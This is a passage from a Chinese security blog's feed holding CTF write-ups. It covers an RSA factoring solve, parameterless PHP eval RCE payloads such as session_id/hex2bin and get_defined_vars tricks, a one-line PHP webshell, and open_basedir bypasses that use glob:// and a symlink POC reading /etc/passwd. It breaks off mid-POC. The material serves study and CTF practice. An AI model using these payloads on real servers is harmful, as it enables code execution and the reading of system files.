title="Anti-Fermat"></a>Anti-Fermat</h3><h2 id="参考【zer0pts-CTF-2022】-Anti-Fermat"><a href="#参考【zer0pts-CTF-2022】-Anti-Fermat" class="headerlink" title="参考【zer0pts CTF 2022】 Anti-Fermat"></a>参考【zer0pts CTF 2022】 Anti-Fermat</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">0x31e22a7a2c5ec946692357dc51014a80530afeb46f419831fcbd896aa1d5cee2d0c69123b3017067afdb3d82b2be3535aebdf11da0fa2b4873233bae6af8a1c2a9344b6f64ade1c6c48a2828130c352053e1729b850774589e8947c8c0a472a8dc90caa542da5cec7f5fa7581747dcb558300437c30b016f769d4a85af8584f311dfb2f9e87fa7d16eaccb0303ecba491619ec7dda72e4037d96c607e666eced582d6eb2c232689fce1c08a54b80cf6d39ef1f2b467d970998c6d54d1779979c89a3b301cd1435bde8787d1141c912cf32b56610fba9205c6e86fefc490c8b2e06f5ed9f775f5b0fe945fa9fca3fc217b4c9dcd4b26676f576d0273b79417b81</span>c <span class="token operator">=</span> <span class="token number">0x118dd8ab5df8685c5db5b1242896df41e8e9016f5f16276b6d311b29f0e5f9315530574b51c6e7c82d0c88ab92787d639443b921a452c850db580256ccfd55ee52ea9732821525da1d21351acb230a799ecaa1802c6f24487176c9cae537c3188e083552a84a2aebdd55c4014b41846768d7608970c1e52d9a68e550ef8bb6016adb6f8e0672e1c8198a5442799a5b8142e8d0fadb6e6146a062ef906bd58c46f31bf65263b6142b1976773289dee408ae233b6c0c534dd5092bd7f331c3457971278d335923edc044ba88852680ee39d1cc84a66dc81b70039e2435892b11f310b490c872448f7a8dc718759b2052b0911f758102a59c54dea061a8a3ff6879</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span>r    t2<span class="token punctuation">,</span>s<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t1<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> s<span class="token punctuation">:</span>        p<span class="token operator">=</span><span class="token punctuation">(</span>t1<span class="token operator">+</span>t2<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        q<span class="token operator">=</span>n<span class="token operator">//</span>p        d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 比赛WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参数RCE</title>
      <link href="/2022/09/13/wu-can-shu-rce/"/>
      <url>/2022/09/13/wu-can-shu-rce/</url>
      
        <content type="html"><![CDATA[<h2 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放入解释器</p><p><img src="/images/image-20220913195432919.png" alt="image-20220913195432919"></p><p> <img src="/images/2541080-20211014112340748-1358197437.png" alt="img"> </p><p> 很明了，get的code只能是函数形式的，且不能带参数。<strong>也就是<code>a();</code> <code>a(a());</code>这种可以，不能是<code>a(&#39;1&#39;);</code>这种</strong> </p><h2 id="利用session-id-php-7以下"><a href="#利用session-id-php-7以下" class="headerlink" title="利用session_id(php 7以下)"></a>利用session_id(php 7以下)</h2><p>php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () ‘，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//706870696e666f28293b</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是呢，<strong>session_id的使用需要开启session，所以需要session_start()函数</strong><br>hex2bin(session_id(session_start()))没事，我们只要数字和字母就可以了，因为可以将我们的参数转化为16进制穿进去，之后再用hex2bin()函数转换回来就可以了。</p><p>所以，payload可以为：<code>code=eval(hex2bin(session_id()));</code><br>但session_id必须要开启session才可以使用，所以我们要先使用session_start。<br>最后，payload：<code>eval(hex2bin(session_id(session_start())));</code><br>在http头中设置PHPSSID为想要执行代码的16进制</p><pre class="line-numbers language-none"><code class="language-none">hex(&quot;phpinfo();&quot;)&#x3D;706870696e666f28293b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20220913201438657.png" alt="image-20220913201438657"></p><p>自己的服务器上打通了</p><p><img src="/images/image-20220913201943096.png" alt="image-20220913201943096"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('ls');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#73797374656d28276c7327293b</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220913202155635.png" alt="image-20220913202155635"></p><h2 id="利用get-defined-vars-函数"><a href="#利用get-defined-vars-函数" class="headerlink" title="利用get_defined_vars ()函数"></a>利用get_defined_vars ()函数</h2><p> get_defined_vars()：返回由所有已定义变量所组成的数组 </p><p>下面我们先做一个实验</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/20200607165250142.png" alt="在这里插入图片描述"></p><p>我们通过get或者post方法传入的参数以及它的值能够通过该函数读取出来，<br>而get_defined_vars()返回的又是一个数组，我们能够通过php的一系列数组函数读取到该数组中任意我们想要的值</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。current() -返回当前元素的当前位置的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">GET: ?code=eval(current(next(get_defined_vars())));POST: 1=system('tac /ctfshowflag');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220913205459379.png" alt="image-20220913205459379"></p><h2 id="利用getallheaders-比较困难"><a href="#利用getallheaders-比较困难" class="headerlink" title="利用getallheaders(比较困难)"></a>利用getallheaders(比较困难)</h2><p> getallheaders返回当前请求的所有请求头信息 </p><p><img src="/images/20200607193104328.png" alt="在这里插入图片描述"> </p><p> 我是直接把Cache-Control的值改了，也可以操作其他的http头 </p><h2 id="其他的读取文件的方法"><a href="#其他的读取文件的方法" class="headerlink" title="其他的读取文件的方法"></a>其他的读取文件的方法</h2><p>直接说利用代码吧</p><p>获得当前目录文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token function">sinh</span><span class="token punctuation">(</span><span class="token function">cosh</span><span class="token punctuation">(</span><span class="token function">tan</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">phpversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//利用三角函数和floor ceil，这个是php7下能够成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得上级目录文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localtime</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这种方法理论上来说，每隔47秒才能成功执行一次</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">cosh</span><span class="token punctuation">(</span><span class="token function">tan</span><span class="token punctuation">(</span><span class="token function">tan</span><span class="token punctuation">(</span><span class="token function">tan</span><span class="token punctuation">(</span><span class="token function">cosh</span><span class="token punctuation">(</span><span class="token function">sinh</span><span class="token punctuation">(</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>找到flag文件后的读取<br>如果flag是最后一个:end()<br>flag处于倒数第二个:next(array_reverse())<br>flag处于其他位置（这种靠运气）:array_rand(array_flip())</p><p>附上三角函数的脚本，可以自己改一改，或者增加点函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ceil"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sinh"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cosh"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"tan"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"floor"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sqrt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cos"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$list</span> <span class="token keyword">as</span> <span class="token variable">$h</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">(</span><span class="token variable">$h</span><span class="token punctuation">(</span><span class="token function">phpversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token comment"># .的ascii为46</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$a</span></span>+<span class="token interpolation"><span class="token variable">$b</span></span>+<span class="token interpolation"><span class="token variable">$c</span></span>+<span class="token interpolation"><span class="token variable">$d</span></span>+<span class="token interpolation"><span class="token variable">$e</span></span>+<span class="token interpolation"><span class="token variable">$f</span></span>+<span class="token interpolation"><span class="token variable">$g</span></span>+<span class="token interpolation"><span class="token variable">$h</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a>dirname()</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://192.168.0.102/?code=show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));"</span>go <span class="token operator">=</span> <span class="token boolean">True</span><span class="token keyword">while</span> go<span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                go <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在爆破...\n"</span><span class="token punctuation">)</span>                <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>open_basedir绕过</title>
      <link href="/2022/09/13/open-basedir-rao-guo/"/>
      <url>/2022/09/13/open-basedir-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h2><p>一般获得代码执行权限之后，一般先是进行目录搜索</p><h2 id="什么是open-basedir"><a href="#什么是open-basedir" class="headerlink" title="什么是open_basedir"></a>什么是open_basedir</h2><p>Open_basedir是PHP设置中<strong>为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查</strong>。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。 一般情况下，我们最多可以绕过open_basedir的限制对其进行列目录。绕过open_basedir进行读写文件危害较大，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p><h2 id="本篇测试脚本"><a href="#本篇测试脚本" class="headerlink" title="本篇测试脚本"></a>本篇测试脚本</h2><p>本篇所用到的php测试文件是一个一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_GET[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且open_basedir设置为&#x2F;var&#x2F;www&#x2F;html<img src="/images/open_basedir_1.png" alt="img">我们先来看下open_basedir起到的作用，以scandir函数为例。当我们sandir的目录为当前目录时，可以正常输出结果。<img src="/images/open_basedir_2.png" alt="img">当尝试输出上层目录时，无法正常输出。<img src="/images/open_basedir_3.png" alt="img"></p><h2 id="通过系统命令执行绕过"><a href="#通过系统命令执行绕过" class="headerlink" title="通过系统命令执行绕过"></a>通过系统命令执行绕过</h2><p>但是open_basedir对系统函数并没有做相关的限制，我们用系统函数可以绕过。<img src="/images/open_basedir_4.png" alt="img"></p><h2 id="利用glob-x2F-x2F-绕过"><a href="#利用glob-x2F-x2F-绕过" class="headerlink" title="利用glob:&#x2F;&#x2F;绕过"></a>利用glob:&#x2F;&#x2F;绕过</h2><h3 id="DirectoryIterator-glob-x2F-x2F"><a href="#DirectoryIterator-glob-x2F-x2F" class="headerlink" title="DirectoryIterator+glob:&#x2F;&#x2F;"></a>DirectoryIterator+glob:&#x2F;&#x2F;</h3><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)<br>脚本差不多如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,成功列出目录:<img src="/images/open_basedir_5.png" alt="img">当传入的参数为<code>glob:///*</code>时会列出根目录下的文件，传入参数为<code>glob://*</code>时会列出open_basedir允许目录下的文件。</p><p><img src="/images/image-20220514004821695-1663068765340.png" alt="image-20220514004821695"></p><h3 id="scandir-glob-x2F-x2F"><a href="#scandir-glob-x2F-x2F" class="headerlink" title="scandir()+glob:&#x2F;&#x2F;"></a>scandir()+glob:&#x2F;&#x2F;</h3><p>这是看TCTF WP里面的一种方法，最为简单明了: 代码如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpvar_dump(scandir(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/open_basedir_6.png" alt="img">这种方法也只能列出根目录和open_basedir允许目录下的文件。</p><h3 id="opendir-readdir-glob-x2F-x2F"><a href="#opendir-readdir-glob-x2F-x2F" class="headerlink" title="opendir()+readdir()+glob:&#x2F;&#x2F;"></a>opendir()+readdir()+glob:&#x2F;&#x2F;</h3><p>脚本如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif ( $b &#x3D; opendir(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;) ) &#123;    while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;        echo $file.&quot;&lt;br&gt;&quot;;    &#125;    closedir($b);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/open_basedir_7.png" alt="img">同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。<br>可以看到，<strong>上面三种和glob:&#x2F;&#x2F;相关的协议，最大的缺陷就是<font color="pink">只能列目录</font>，而且还只能列根目录和open_basedir允许目录的内容。</strong></p><h2 id="利用symlink-绕过（比较常用）"><a href="#利用symlink-绕过（比较常用）" class="headerlink" title="利用symlink()绕过（比较常用）"></a>利用symlink()绕过（比较常用）</h2><h3 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h3><p>symlink()对于已有的target建立一个名为link的符号连接。<br>用法如下:</p><ul><li>symlink (string target,stringtarget,stringlink) symlink()对于已有的 target(一般情况下受限于open_basedir)建立一个名为link的符号连接。</li><li>成功时返回TRUE， 或者在失败时返回FALSE。 示例用法如下:</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php$target &#x3D; &#39;uploads.php&#39;;$link &#x3D; &#39;uploads&#39;;symlink($target, $link);echo readlink($link);# 将会输出&#39;uploads.php&#39;这个字符串?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="POC及原理分析"><a href="#POC及原理分析" class="headerlink" title="POC及原理分析"></a>POC及原理分析</h3><p>假如我们要读取&#x2F;etc&#x2F;passwd,对应的POC为:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpmkdir(&quot;a&quot;);chdir(&quot;a&quot;);mkdir(&quot;b&quot;);chdir(&quot;b&quot;);mkdir(&quot;c&quot;);chdir(&quot;c&quot;);mkdir(&quot;d&quot;);chdir(&quot;d&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);symlink(&quot;a&#x2F;b&#x2F;c&#x2F;d&quot;,&quot;Von&quot;);symlink(&quot;Von&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;,&quot;exp&quot;);unlink(&quot;Von&quot;);mkdir(&quot;Von&quot;);system(&#39;cat exp&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/open_basedi_8.png" alt="img">成功读取&#x2F;etc&#x2F;passwd.<br>我们来分析下这个POC </p><p><strong>1.</strong> 首先前面8步,实现了创建a&#x2F;b&#x2F;c&#x2F;d目录,并把当前目录移动到该目录下面。<br><strong>2.</strong> 接着symlink(“a&#x2F;b&#x2F;c&#x2F;d”,”Von”)创建了一个符号文件Von,指向了a&#x2F;b&#x2F;c&#x2F;d<br><strong>3.</strong> 接着symlink(“Von&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”,”exp”),由于此时Von仍然是一个符号文件,所以等价于symlink(“a&#x2F;b&#x2F;c&#x2F;d&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”,”exp”),由于此时<strong>a&#x2F;b&#x2F;c&#x2F;d&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;的结果等于&#x2F;var&#x2F;www&#x2F;html</strong>,符合<strong>open_basedir的限制,因此软链接可以被成功建立</strong><br><strong>4.</strong> 但是之后我们<strong>删除了Von这个软链接，并且建立了一个真实的文件夹Von</strong>,所以此时上面symlink(“Von&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”,”exp”)中的Von不再是软链接而是一个真实的目录。从而达到跨目录访问的效果。 其实到了这一步，我们直接访问根目录下的exp文件能得到结果，我上面是为了让结果直观展示出来才利用使用了system(‘cat exp’)来得到结果。(一般情况下system()是被禁的)<img src="/images/open_basedi_10.png" alt="img">给出两个大神的POC</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;* * by phithon * From https:&#x2F;&#x2F;www.leavesongs.com * detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068 *&#x2F;header(&#39;content-type: text&#x2F;plain&#39;);error_reporting(-1);ini_set(&#39;display_errors&#39;, TRUE);printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);$relat_file &#x3D; getRelativePath(__FILE__, $file);$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);$name &#x3D; mt_rand() % 999;$exp &#x3D; getRandStr();mkdir($name);chdir($name);for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;    mkdir($paths[$i]);    chdir($paths[$i]);&#125;mkdir($paths[$i]);for ($i -&#x3D; 1; $i &gt; 0; $i--) 